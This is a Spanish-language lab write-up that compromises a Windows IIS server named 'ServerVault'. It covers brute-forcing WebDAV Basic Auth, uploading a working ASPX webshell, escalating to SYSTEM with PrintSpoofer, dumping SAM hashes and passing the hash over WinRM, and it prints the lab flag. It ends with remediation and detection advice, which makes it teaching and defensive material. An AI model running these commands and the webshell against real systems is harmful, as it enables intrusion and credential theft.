# ServerVault — Writeup de resolución

**Laboratorio:** ServerVault  
**Nivel:** Medium  
**Categoría:** IIS & WebDAV Exploitation · Windows Token Abuse  
**Autor:** chifay  
**Fecha:** 2026-10-27  
**Objetivo:** `192.168.60.131` — `SERVERVAULT`  
**Atacante:** Kali Linux — `192.168.60.129`  
**Resultado:** RCE como `IIS APPPOOL\DefaultAppPool`, escalada a `NT AUTHORITY\SYSTEM`, lectura de la flag y Pass-the-Hash como `Administrator` sobre WinRM.

> **Flag:** `flag{w3bd4v_4spx_s31mp3rs0n4t3_pr1v3sc_m4st3r}`

La flag se leyó como `NT AUTHORITY\SYSTEM` desde `C:\Users\Administrator\Desktop\flag.txt`. La cadena anterior es la que devolvió el archivo de la bandera, sin transformación.

---

## 1. Resumen ejecutivo

ServerVault es un Windows Server 2019 con IIS 10.0, WebDAV habilitado y un directorio `/storage/` protegido con autenticación Basic. La cuenta `operator` utilizaba la contraseña `matrix`, presente en la línea 610 de `rockyou.txt`. Con esa credencial se pudo escribir un webshell ASPX en `/storage/` mediante `PUT`, lo que dio ejecución de comandos como `IIS APPPOOL\DefaultAppPool`.

El pool de aplicaciones tenía `SeImpersonatePrivilege` habilitado. Se subió `PrintSpoofer64.exe`, se abusó del token del servicio Print Spooler y se obtuvo una sesión como `NT AUTHORITY\SYSTEM`. Desde ahí se leyeron la flag y se generó un volcado en vivo de los hives `SAM` y `SYSTEM` con `reg save`. `secretsdump.py` extrajo el hash NTLM de `Administrator`, que se utilizó para autenticarse por WinRM mediante Pass-the-Hash.

| Fase | Resultado |
|---|---|
| Reconocimiento | 80/tcp (IIS 10.0 + WebDAV), 3389/tcp (RDP) y 5985/tcp (WinRM); sin SMB expuesto |
| Credenciales | `operator:matrix` — línea 610 de `rockyou.txt` |
| Acceso inicial | `PUT /storage/shell.aspx` → `201 Created`; RCE como `IIS APPPOOL\DefaultAppPool` |
| Escalada | `SeImpersonatePrivilege` → `PrintSpoofer64.exe` → `NT AUTHORITY\SYSTEM` |
| Flag | `flag{w3bd4v_4spx_s31mp3rs0n4t3_pr1v3sc_m4st3r}` |
| Post-explotación | Volcado en vivo de `SAM`/`SYSTEM` como SYSTEM; hash de `Administrator` |
| Acceso administrativo | Pass-the-Hash por WinRM: `servervault\administrator` |

Cadena de ataque:

```text
operator:matrix
  └─> WebDAV PUT /storage/shell.aspx
        └─> RCE como IIS APPPOOL\DefaultAppPool
              └─> SeImpersonatePrivilege
                    └─> PrintSpoofer64.exe
                          └─> NT AUTHORITY\SYSTEM
                                ├─> flag.txt
                                └─> reg save SAM + SYSTEM
                                      └─> secretsdump.py
                                            └─> hash Administrator
                                                  └─> evil-winrm Pass-the-Hash
```

Los hives `SAM` y `SYSTEM` analizados en este informe se generaron en caliente en el propio servidor, dentro de la sesión SYSTEM, mediante `reg save`. Los hashes mostrados provienen de esa copia en vivo, que es su único origen.

---

## 2. Reconocimiento

### 2.1. Escaneo completo de puertos

```bash
nmap -n -Pn -p- --min-rate 3000 -T4 192.168.60.131
```

Resultado relevante:

```text
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
MAC Address: 00:0C:29:6D:45:3F (VMware)
```

El escaneo tardó 43,95 segundos. Solo tres puertos quedaron abiertos: HTTP, RDP y WinRM. No se observó SMB (445/tcp), lo que reduce la superficie inicial a la aplicación web y a los servicios de administración remota.

![Escaneo completo de puertos](evidencia/01-recon-nmap-full.png)

### 2.2. Detección de servicios y sistema operativo

```bash
nmap -n -Pn -sV -sC -p 80,3389,5985 192.168.60.131
```

Hallazgos principales:

| Puerto | Servicio | Detalle |
|---|---|---|
| 80/tcp | HTTP | `Microsoft-IIS/10.0`, `X-Powered-By: ASP.NET`, título `ServerVault Enterprise Storage` |
| 3389/tcp | RDP | `Microsoft Terminal Services`; certificado `CN=SERVERVAULT`; `Product_Version: 10.0.17763` |
| 5985/tcp | WinRM | `Microsoft-HTTPAPI/2.0`; `http-title: Not Found` |

El script `http-webdav-scan` identificó WebDAV y enumeró los métodos permitidos:

```text
Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND,
                 DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
Public Options:  OPTIONS, TRACE, GET, HEAD, POST, PROPFIND,
                 PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
```

También listó los recursos públicos del sitio: `/`, `/aspnet_client/`, `/iisstart.htm`, `/iisstart.png`, `/index.html` y `/storage/`. El RDP reveló el nombre `SERVERVAULT` y la build `10.0.17763`, coherente con Windows Server 2019.

![Detección de servicios](evidencia/02-recon-nmap-services.png)

### 2.3. Enumeración WebDAV

`OPTIONS /` confirmó que WebDAV está activo (`DAV: 1,2,3`) y que el servidor anuncia métodos de escritura:

```bash
curl -s -i -X OPTIONS http://192.168.60.131/ | head -12
```

```text
HTTP/1.1 200 OK
Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE,
       PROPPATCH, MKCOL, LOCK, UNLOCK
Public: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL,
        PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
DAV: 1,2,3
MS-Author-Via: DAV
X-Powered-By: ASP.NET
```

El directorio `/storage/` respondió con `401 Unauthorized` y un reto Basic:

```bash
curl -s -i http://192.168.60.131/storage/ | head -10
```

```text
HTTP/1.1 401 Unauthorized
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
WWW-Authenticate: Basic realm="192.168.60.131"
Content-Length: 1293
```

`PROPFIND` sin autenticación devolvió `207 Multi-Status` y permitió enumerar el árbol público, incluida la existencia de `/storage/`:

```bash
curl -s -X PROPFIND -H 'Depth: 1' http://192.168.60.131/ \
  | grep -o '<D:href>[^<]*</D:href>' | head -8
```

```text
<D:href>http://192.168.60.131/</D:href>
<D:href>http://192.168.60.131/aspnet_client/</D:href>
<D:href>http://192.168.60.131/iisstart.htm</D:href>
<D:href>http://192.168.60.131/iisstart.png</D:href>
<D:href>http://192.168.60.131/index.html</D:href>
<D:href>http://192.168.60.131/storage/</D:href>
```

La combinación es clara: WebDAV con `PUT` habilitado, un directorio protegido por Basic Auth y un servidor IIS que podría ejecutar archivos `.aspx` subidos al directorio correcto. La única pieza que nos falta es una credencial válida.

![Enumeración WebDAV](evidencia/03-webdav-enum.png)

---

## 3. Obtención y validación de credenciales

### 3.1. Cuenta objetivo y diccionario

La cuenta de bajos privilegios es `operator` (observable desde el login de la máquina ServerVault). Se utilizó `rockyou.txt`, el diccionario estándar de Kali Linux:

```bash
wc -l /usr/share/wordlists/rockyou.txt
grep -n '^matrix$' /usr/share/wordlists/rockyou.txt
```

```text
14344392 /usr/share/wordlists/rockyou.txt
610:matrix
```

La contraseña `matrix` ocupa la línea 610 del diccionario. Es una contraseña de diccionario, corta y trivialmente adivinable, lo que explica que todos los ataques en línea la encontraran en segundos.

> **Nota sobre los contadores:** Hydra reporta `14344399` intentos y Medusa `14344391`, porque cada herramienta indexa el fichero con su propio criterio. El dato verificable con `wc -l` es `14344392`, y la posición real de `matrix` verificada con `grep -n` es la `610`.

### 3.2. Hydra

```bash
hydra -l operator -P /usr/share/wordlists/rockyou.txt -s 80 -f -t 16 -I \
  192.168.60.131 http-get /storage/
```

Salida relevante:

```text
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries
[DATA] attacking http-get://192.168.60.131:80/storage/
[80][http-get] host: 192.168.60.131   misc: /storage/   login: operator   password: matrix
[STATUS] attack finished for 192.168.60.131 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

Tiempo medido: **5,130 s**.

![Hydra](evidencia/04-brute-hydra.png)

### 3.3. Medusa

```bash
medusa -h 192.168.60.131 -u operator \
  -P /usr/share/wordlists/rockyou.txt \
  -M http -m DIR:/storage/ -m AUTH:BASIC -f -t 16 2>&1 | tail -20
```

Salida relevante:

```text
ACCOUNT CHECK: [http] Host: 192.168.60.131 (1 of 1, 0 complete)
  User: operator (1 of 1, 0 complete)
  Password: matrix (606 of 14344391 complete)
ACCOUNT FOUND: [http] Host: 192.168.60.131 User: operator
  Password: matrix [SUCCESS]
```

Medusa reporta el hallazgo en su contador interno como `606`; la posición real en `rockyou.txt`, verificada con `grep -n`, es la `610`.

Tiempo medido: **0,848 s**.

![Medusa](evidencia/05-brute-medusa.png)

### 3.4. Ncrack

```bash
ncrack -vv --user operator -P /usr/share/wordlists/rockyou.txt -f -T4 \
  -m http:path=/storage/ http://192.168.60.131
```

Salida relevante:

```text
Discovered credentials on http://192.168.60.131:80 'operator' 'matrix'
Discovered credentials for http on 192.168.60.131 80/tcp:
192.168.60.131 80/tcp http: 'operator' 'matrix'
Ncrack done: 1 service scanned in 9.60 seconds.
Probes sent: 2 | timed-out: 0 | prematurely-closed: 0
```

Tiempo medido: **9,637 s**.

![Ncrack](evidencia/06-brute-ncrack.png)

### 3.5. Nmap `http-brute`

Se preparó una lista corta de usuarios y contraseñas en `~/ServerVault/confirm/` para validar el script NSE:

```bash
cat ~/ServerVault/confirm/pw.txt
```

```text
wrong1
password
matrix
admin
```

```bash
cat ~/ServerVault/confirm/brute.args
```

```text
http-brute.path=/storage/,userdb=confirm/users.txt,passdb=confirm/pw.txt,brute.firstonly=true
```

```bash
nmap -n -Pn -p80 --script http-brute \
  --script-args-file ~/ServerVault/confirm/brute.args \
  192.168.60.131
```

Salida relevante:

```text
PORT   STATE SERVICE
80/tcp open  http
| http-brute:
|   Accounts:
|     operator:matrix - Valid credentials
|_  Statistics: Performed 5 guesses in 1 seconds, average tps: 5.0
```

Tiempo medido: **0,267 s**. El script contabiliza 5 intentos sobre una lista de 4 contraseñas; Nmap redondea a 1 segundo en su estadística interna, mientras que el tiempo de pared medido fue 0,267 s.

![Nmap http-brute](evidencia/07-brute-nmap.png)

### 3.6. ffuf

Para que el corte fuera determinista se usaron las primeras 610 líneas de `rockyou.txt`, que incluyen `matrix`:

```bash
head -610 /usr/share/wordlists/rockyou.txt > ~/ServerVault/rockyou_610.txt
wc -l ~/ServerVault/rockyou_610.txt
ffuf -u 'http://operator:FUZZ@192.168.60.131/storage/' \
  -w ~/ServerVault/rockyou_610.txt -mc 200 -t 16 -s
```

Salida:

```text
610 /home/chifay/ServerVault/rockyou_610.txt
matrix
```

Tiempo medido: **0,258 s**.

![ffuf](evidencia/08-brute-ffuf.png)

### 3.7. Wget

Se guardó un bucle de Wget en `~/ServerVault/confirm/wget_brute_rockyou.sh` y se ejecutó contra `/storage/` para comprobar cada contraseña de las primeras 610 líneas:

```bash
bash ~/ServerVault/confirm/wget_brute_rockyou.sh
```

Contenido del script:

```bash
#!/bin/bash
n=0
while IFS= read -r p; do
  n=$((n+1))
  if wget -q -O /dev/null --user=operator --password="$p" \
       http://192.168.60.131/storage/; then
    echo "[+] operator:$p (intento $n)"
    exit 0
  fi
  if [ $((n % 100)) -eq 0 ]; then
    echo "[*] $n intentos..."
  fi
done < <(head -610 /usr/share/wordlists/rockyou.txt)
echo "[-] sin acierto"
```

Salida:

```text
[*] 100 intentos...
[*] 200 intentos...
[*] 300 intentos...
[*] 400 intentos...
[*] 500 intentos...
[*] 600 intentos...
[+] operator:matrix (intento 610)
```

Wget confirmó la credencial en el intento 610. No se registró un tiempo de pared para este bucle; su valor probatorio es la secuencia de intentos y el acierto final.

![Wget](evidencia/09-brute-wget.png)

### 3.8. Cadaver

Cadaver es el cliente WebDAV nativo del laboratorio. Se configuró `~/ServerVault/confirm/.netrc` con la credencial obtenida y se comprobó que la cuenta no solo autenticaba, sino que podía crear colecciones, subir archivos y borrarlos:

```text
machine 192.168.60.131
login operator
password matrix
```

Contenido de `~/ServerVault/confirm/cadaver.cmds`:

```text
mkcol cadaver_test
cd cadaver_test
put confirm/cadaver_test.txt
ls
delete cadaver_test.txt
cd ..
rmcol cadaver_test
quit
```

Ejecución:

```bash
HOME=~/ServerVault/confirm cadaver http://192.168.60.131/storage/ \
  < ~/ServerVault/confirm/cadaver.cmds
```

Salida relevante:

```text
dav:/storage/> mkcol cadaver_test
Creating `cadaver_test': succeeded.
dav:/storage/cadaver_test/> put confirm/cadaver_test.txt
Uploading confirm/cadaver_test.txt to `/storage/cadaver_test/cadaver_test.txt': [.. succeeded.
dav:/storage/cadaver_test/> ls
Listing collection `/storage/cadaver_test/': succeeded.
        cadaver_test.txt                      13  Oct 27 18:56
dav:/storage/cadaver_test/> delete cadaver_test.txt
Deleting `/storage/cadaver_test/cadaver_test.txt': succeeded.
dav:/storage/> rmcol cadaver_test
Deleting collection `/storage/cadaver_test/': succeeded.
```

La operación `MKCOL` → `PUT` → `DELETE` → `RMCOL` confirmó permisos de escritura reales sobre `/storage/`, el requisito previo para subir el webshell.

![Cadaver](evidencia/10-brute-cadaver.png)

### 3.9. Validación consolidada

```bash
grep -n '^matrix$' /usr/share/wordlists/rockyou.txt
wc -l /usr/share/wordlists/rockyou.txt
curl -s -o /dev/null -w 'operator:matrix -> %{http_code}\n' \
  -u operator:matrix http://192.168.60.131/storage/
curl -s -o /dev/null -w 'operator:wrong  -> %{http_code}\n' \
  -u operator:wrong http://192.168.60.131/storage/
```

```text
610:matrix
14344392 /usr/share/wordlists/rockyou.txt
operator:matrix -> 200
operator:wrong  -> 401
```

La diferencia entre `200` y `401` confirma que la credencial es válida y que el servidor distingue correctamente entre autenticación exitosa y fallida.

![Validación de credenciales](evidencia/11-creds-validated.png)

### 3.10. Resumen de herramientas

| Herramienta | Diccionario / modo | Resultado | Tiempo |
|---|---|---|---|
| Hydra | `rockyou.txt` completo, 16 tareas, `http-get` | `operator:matrix` | 5,130 s |
| Medusa | `rockyou.txt` completo, módulo HTTP Basic, 16 hilos | `operator:matrix` | 0,848 s |
| Ncrack | `rockyou.txt` completo, `http:path=/storage/` | `operator:matrix` | 9,637 s |
| Nmap `http-brute` | Lista corta de 4 contraseñas | `operator:matrix` (5 intentos) | 0,267 s |
| ffuf | Primeras 610 líneas de `rockyou.txt` | `matrix` | 0,258 s |
| Wget | Bucle sobre las primeras 610 líneas | `operator:matrix` (intento 610) | — |
| Cadaver | `.netrc` + `MKCOL`/`PUT`/`DELETE` | Escritura WebDAV confirmada | — |

Los tiempos se midieron en ejecuciones independientes y se conservan en `evidencia/raw/tiempos/`. Las capturas muestran únicamente los comandos y su salida, sin el wrapper de medición.

---

## 4. Acceso inicial: webshell ASPX sobre WebDAV

Con la credencial validada, se subió un webshell ASPX mínimo a `/storage/`. El código ejecuta `cmd.exe /c` con el parámetro `c` y devuelve la salida estándar:

```aspx
<%@ Page Language="C#" %>
<%  System.Diagnostics.Process i = new System.Diagnostics.Process();
    i.StartInfo.FileName = "cmd.exe";
    i.StartInfo.Arguments = "/c " + Request.QueryString["c"];
    i.StartInfo.UseShellExecute = false;
    i.StartInfo.RedirectStandardOutput = true;
    i.Start();
    Response.Write(i.StandardOutput.ReadToEnd()); %>
```

Subida mediante WebDAV:

```bash
curl -s -i -u operator:matrix \
  -T ~/ServerVault/shell.aspx \
  -H 'Expect:' \
  http://192.168.60.131/storage/shell.aspx | head -6
```

```text
HTTP/1.1 201 Created
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Wed, 28 Oct 2026 00:57:24 GMT
Content-Length: 0
```

El `201 Created` confirma que IIS aceptó la escritura. Las capturas de subida muestran un `DELETE` previo para reemplazar cualquier copia anterior; la evidencia relevante es el `PUT` que responde `201 Created`. A continuación se comprobó la ejecución:

```bash
curl -s -u operator:matrix --get \
  --data-urlencode 'c=whoami' \
  http://192.168.60.131/storage/shell.aspx
```

```text
iis apppool\defaultapppool
```

```bash
curl -s -u operator:matrix --get \
  --data-urlencode 'c=hostname & ver' \
  http://192.168.60.131/storage/shell.aspx
```

```text
SERVERVAULT

Microsoft Windows [Version 10.0.17763.3650]
```

El webshell quedó disponible en:

```text
http://192.168.60.131/storage/shell.aspx?c=<comando>
```

La causa raíz es la combinación de WebDAV con `PUT` habilitado, autenticación Basic y un directorio de subida desde el que IIS ejecuta extensiones `.aspx`. El servidor no solo permitió escribir: también ejecutó el archivo subido.

![Subida del webshell](evidencia/12-webshell-upload.png)

---

## 5. Enumeración de privilegios y escalada a SYSTEM

### 5.1. Privilegios del pool de aplicaciones

```bash
curl -s -u operator:matrix --get \
  --data-urlencode 'c=whoami /priv' \
  http://192.168.60.131/storage/shell.aspx
```

```text
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` estaba **Enabled**. Es el privilegio que permite a un proceso adoptar el token de otro cliente autenticado; en un servidor con Print Spooler activo es un camino directo a `SYSTEM` mediante herramientas como PrintSpoofer. `SeAssignPrimaryTokenPrivilege` estaba deshabilitado, pero no era necesario: PrintSpoofer utiliza `SeImpersonatePrivilege`.

![Privilegios del app pool](evidencia/13-privileges.png)

### 5.2. PrintSpoofer

Se subió `PrintSpoofer64.exe` por WebDAV:

```bash
curl -s -i -u operator:matrix \
  -T ~/ServerVault/PrintSpoofer64.exe \
  -H 'Expect:' \
  http://192.168.60.131/storage/PrintSpoofer64.exe | head -6
```

```text
HTTP/1.1 201 Created
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Content-Length: 0
```

Las siguientes órdenes usan dos variables para abreviar las rutas:

```bash
U=http://192.168.60.131/storage/shell.aspx
S='C:\inetpub\wwwroot\storage'
```

Se verificó la integridad del binario en el objetivo:

```bash
curl -s -u operator:matrix --get \
  --data-urlencode "c=certutil -hashfile $S\PrintSpoofer64.exe SHA256" \
  "$U"
```

```text
SHA256 hash of C:\inetpub\wwwroot\storage\PrintSpoofer64.exe:
8524fbc0d73e711e69d60c64f1f1b7bef35c986705880643dd4d5e17779e586d
CertUtil: -hashfile command completed successfully.
```

Ejecución para lanzar `whoami` como SYSTEM y guardar la salida:

```bash
curl -s -u operator:matrix --get \
  --data-urlencode "c=$S\PrintSpoofer64.exe -c \"cmd /c whoami > $S\syswhoami.txt\"" \
  "$U"
```

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

```bash
curl -s -u operator:matrix --get \
  --data-urlencode "c=type $S\syswhoami.txt" \
  "$U"
```

```text
nt authority\system
```

PrintSpoofer crea un named pipe, coacciona al servicio Print Spooler para que se conecte y utiliza el token de SYSTEM resultante para llamar a `CreateProcessAsUser()`. La ejecución fue exitosa y confirmó la escalada completa.

![PrintSpoofer](evidencia/14-printspoofer.png)

---

## 6. Flag

Con la sesión SYSTEM se leyó la flag del escritorio de `Administrator` y se copió al directorio de trabajo:

```bash
curl -s -u operator:matrix --get \
  --data-urlencode "c=$S\PrintSpoofer64.exe -c \"cmd /c type C:\Users\Administrator\Desktop\flag.txt > $S\sysflag.txt\"" \
  "$U"
```

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

```bash
curl -s -u operator:matrix --get \
  --data-urlencode "c=type $S\sysflag.txt" \
  "$U"
```

```text
flag{w3bd4v_4spx_s31mp3rs0n4t3_pr1v3sc_m4st3r}
```

![Flag](evidencia/15-flag.png)

---

## 7. Post-explotación: volcado en vivo de SAM y SYSTEM

### 7.1. Generación de los hives como SYSTEM

Para demostrar el acceso a credenciales y habilitar el movimiento lateral se creó un batch que guarda los hives y otorga lectura al grupo `Everyone`:

```bat
reg save HKLM\SAM C:\inetpub\wwwroot\storage\SAM.hiv /y
reg save HKLM\SYSTEM C:\inetpub\wwwroot\storage\SYSTEM.hiv /y
icacls C:\inetpub\wwwroot\storage\SAM.hiv /grant Everyone:R
icacls C:\inetpub\wwwroot\storage\SYSTEM.hiv /grant Everyone:R
```

El batch se subió por WebDAV:

```bash
curl -s -i -u operator:matrix \
  -T ~/ServerVault/dump.bat \
  -H 'Expect:' \
  http://192.168.60.131/storage/dump.bat | head -6
```

```text
HTTP/1.1 201 Created
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Content-Length: 0
```

Después se ejecutó a través de PrintSpoofer, por lo que `reg save` corrió con el token de `NT AUTHORITY\SYSTEM`:

```bash
curl -s -u operator:matrix --get \
  --data-urlencode "c=$S\PrintSpoofer64.exe -c \"cmd /c $S\dump.bat > $S\dump.log 2>&1\"" \
  "$U"
```

```text
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

Salida del batch:

```text
C:\Windows\system32>reg save HKLM\SAM C:\inetpub\wwwroot\storage\SAM.hiv /y
The operation completed successfully.

C:\Windows\system32>reg save HKLM\SYSTEM C:\inetpub\wwwroot\storage\SYSTEM.hiv /y
The operation completed successfully.

C:\Windows\system32>icacls C:\inetpub\wwwroot\storage\SAM.hiv /grant Everyone:R
processed file: C:\inetpub\wwwroot\storage\SAM.hiv
Successfully processed 1 files; Failed processing 0 files

C:\Windows\system32>icacls C:\inetpub\wwwroot\storage\SYSTEM.hiv /grant Everyone:R
processed file: C:\inetpub\wwwroot\storage\SYSTEM.hiv
Successfully processed 1 files; Failed processing 0 files
```

Para descargarlos por HTTP se copiaron a archivos con extensión `.txt`; el contenido sigue siendo el hive binario:

```bash
curl -s -u operator:matrix --get \
  --data-urlencode "c=copy /Y $S\SAM.hiv $S\SAM_live.txt & copy /Y $S\SYSTEM.hiv $S\SYSTEM_live.txt" \
  "$U"
```

```text
        1 file(s) copied.
        1 file(s) copied.
```

![Volcado en vivo de SAM y SYSTEM](evidencia/16-sam-dump.png)

### 7.2. Extracción de hashes

Descarga al equipo atacante:

```bash
H=~/ServerVault/live-hives
curl -s -u operator:matrix -o $H/SAM.hiv \
  http://192.168.60.131/storage/SAM_live.txt
curl -s -u operator:matrix -o $H/SYSTEM.hiv \
  http://192.168.60.131/storage/SYSTEM_live.txt
ls -lh $H/SAM.hiv $H/SYSTEM.hiv
```

```text
-rw-rw-r-- 1 chifay chifay  56K Oct 27 18:57 /home/chifay/ServerVault/live-hives/SAM.hiv
-rw-rw-r-- 1 chifay chifay  17M Oct 27 18:57 /home/chifay/ServerVault/live-hives/SYSTEM.hiv
```

Extracción local con Impacket:

```bash
secretsdump.py -sam $H/SAM.hiv -system $H/SYSTEM.hiv LOCAL
```

```text
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x8c55d89032c291a3d5dc4b83a664bcee
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88e1db77ee01e9e14dfc4dac2617f266:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7cbca7f271ae575fae4fc77bc038a0db:::
operator:1002:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
[*] Cleaning up...
```

| Cuenta | RID | Hash NTLM |
|---|---|---|
| `Administrator` | 500 | `88e1db77ee01e9e14dfc4dac2617f266` |
| `operator` | 1002 | `c02478537b9727d391bc80011c2e2321` |

Los hives se generaron y descargaron durante la sesión SYSTEM, directamente desde el servidor comprometido. Este es el único origen de los hashes de esta sección.

![Extracción de hashes con secretsdump](evidencia/17-secretsdump.png)

---

## 8. Pass-the-Hash sobre WinRM

WinRM acepta autenticación NTLM y el hash de `Administrator` es suficiente para autenticarse sin conocer la contraseña en claro:

```bash
evil-winrm -i 192.168.60.131 -u Administrator \
  -H 88e1db77ee01e9e14dfc4dac2617f266
```

```text
Info: Establishing connection to remote endpoint
Info: Connection successful
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
servervault\administrator
```

La cuenta `operator` no tiene autorización para WinRM, aunque su credencial sea válida para WebDAV:

```bash
evil-winrm -i 192.168.60.131 -u operator -p matrix
```

```text
Error: Cannot establish connection to remote endpoint.
Check credentials and network.
Error: WinRM::WinRMAuthorizationError: WinRM::WinRMAuthorizationError
```

La combinación demuestra dos cosas: `operator` está limitado al acceso web y el hash de `Administrator` permite un acceso administrativo remoto completo por WinRM.

![Pass-the-Hash por WinRM](evidencia/18-pth-winrm.png)

---

## 9. Hallazgos y criticidad

| # | Hallazgo | Severidad | Impacto |
|---|---|---|---|
| 1 | Credencial débil `operator:matrix` en Basic Auth | Crítica | Acceso a `/storage/` y a la superficie de escritura WebDAV |
| 2 | WebDAV con `PUT` y ejecución de `.aspx` en el directorio de subida | Crítica | RCE como `IIS APPPOOL\DefaultAppPool` |
| 3 | `SeImpersonatePrivilege` habilitado en el app pool | Alta | Escalada de privilegios por robo de token |
| 4 | Print Spooler activo y accesible | Alta | PrintSpoofer permite obtener `NT AUTHORITY\SYSTEM` |
| 5 | WinRM expuesto y NTLM habilitado | Alta | Pass-the-Hash con el hash de `Administrator` |
| 6 | Basic Auth sobre HTTP sin TLS | Media | Credenciales expuestas a interceptación |
| 7 | `PROPFIND` anónimo con `Depth: 1` | Media | Enumeración del árbol y de recursos protegidos |
| 8 | Hives `SAM`/`SYSTEM` accesibles tras obtener SYSTEM | Alta | Extracción de hashes locales y reutilización de credenciales |

---

## 10. MITRE ATT&CK

| Técnica | ID | Uso en el laboratorio |
|---|---|---|
| Active Scanning | T1595 | Escaneo completo de puertos con Nmap |
| Network Service Discovery | T1046 | Identificación de HTTP, RDP y WinRM |
| File and Directory Discovery | T1083 | Enumeración WebDAV con `PROPFIND` |
| Brute Force: Password Guessing | T1110.001 | Hydra, Medusa, Ncrack, Nmap, ffuf y Wget |
| Valid Accounts | T1078 | Uso de `operator:matrix` |
| Web Shell | T1505.003 | `shell.aspx` en `/storage/` |
| Windows Command Shell | T1059.003 | Ejecución de comandos mediante `cmd.exe /c` |
| Ingress Tool Transfer | T1105 | Subida de `shell.aspx`, `PrintSpoofer64.exe` y `dump.bat` |
| Access Token Manipulation: Token Impersonation/Theft | T1134.001 | PrintSpoofer sobre `SeImpersonatePrivilege` |
| OS Credential Dumping: SAM | T1003.002 | `reg save HKLM\SAM` y `HKLM\SYSTEM` como SYSTEM |
| Use Alternate Authentication Material: Pass the Hash | T1550.002 | `evil-winrm -H` con el hash de `Administrator` |
| Remote Services: Windows Remote Management | T1021.006 | Acceso administrativo por WinRM |

---

## 11. Recomendaciones

1. **Eliminar la escritura WebDAV en `/storage/`** si no es una necesidad funcional. Si se mantiene, restringirla a usuarios y extensiones concretas.
2. **Impedir la ejecución de archivos subidos.** Configurar `requestFiltering` para denegar `.aspx`, `.ashx`, `.asmx`, `.exe`, `.dll` y `.config` en directorios de carga; almacenar los uploads fuera del web root.
3. **Sustituir Basic Auth sobre HTTP** por HTTPS con autenticación integrada de Windows o un mecanismo con MFA. Deshabilitar Basic Auth si no es imprescindible.
4. **Aplicar contraseñas fuertes y únicas.** `matrix` es una contraseña de diccionario; usar LAPS para cuentas locales y auditar la reutilización de credenciales.
5. **Deshabilitar Print Spooler** en servidores que no impriman. Si debe estar activo, aplicar las mitigaciones de PrintNightmare y restringir la exposición del spooler.
6. **Restringir WinRM** a administradores y a redes de gestión. Deshabilitarlo si no se utiliza y priorizar HTTPS sobre HTTP.
7. **Mitigar Pass-the-Hash:** Credential Guard, Protected Users, restricción de NTLM y eliminación de hashes reutilizables cuando sea posible.
8. **Reducir privilegios del app pool.** Revisar si `SeImpersonatePrivilege` es realmente necesario para la aplicación y eliminarlo mediante política si no lo es.
9. **Monitorizar la cadena de ataque:** `PUT` WebDAV de extensiones ejecutables, procesos hijos de `w3wp.exe`, creación de named pipes, `reg save` de `SAM`/`SYSTEM`, logons WinRM tipo 3/8 y eventos `4688`/`4672`.

---

## 12. Artefactos y limpieza

### 12.1. Artefactos en el objetivo

```text
C:\inetpub\wwwroot\storage\shell.aspx
C:\inetpub\wwwroot\storage\PrintSpoofer64.exe
C:\inetpub\wwwroot\storage\dump.bat
C:\inetpub\wwwroot\storage\dump.log
C:\inetpub\wwwroot\storage\SAM.hiv
C:\inetpub\wwwroot\storage\SYSTEM.hiv
C:\inetpub\wwwroot\storage\SAM_live.txt
C:\inetpub\wwwroot\storage\SYSTEM_live.txt
C:\inetpub\wwwroot\storage\syswhoami.txt
C:\inetpub\wwwroot\storage\sysflag.txt
```

Limpieza sugerida, ejecutada como `Administrator` o `SYSTEM`:

```cmd
del /f /q C:\inetpub\wwwroot\storage\shell.aspx
del /f /q C:\inetpub\wwwroot\storage\PrintSpoofer64.exe
del /f /q C:\inetpub\wwwroot\storage\dump.bat
del /f /q C:\inetpub\wwwroot\storage\dump.log
del /f /q C:\inetpub\wwwroot\storage\SAM.hiv
del /f /q C:\inetpub\wwwroot\storage\SYSTEM.hiv
del /f /q C:\inetpub\wwwroot\storage\SAM_live.txt
del /f /q C:\inetpub\wwwroot\storage\SYSTEM_live.txt
del /f /q C:\inetpub\wwwroot\storage\syswhoami.txt
del /f /q C:\inetpub\wwwroot\storage\sysflag.txt
```

Los hives y las copias `.txt` contienen material de credenciales; deben eliminarse de forma segura y no conservarse en el servidor.

### 12.2. Evidencia local

```text
README.md
evidencia/01-recon-nmap-full.png
evidencia/02-recon-nmap-services.png
evidencia/03-webdav-enum.png
evidencia/04-brute-hydra.png
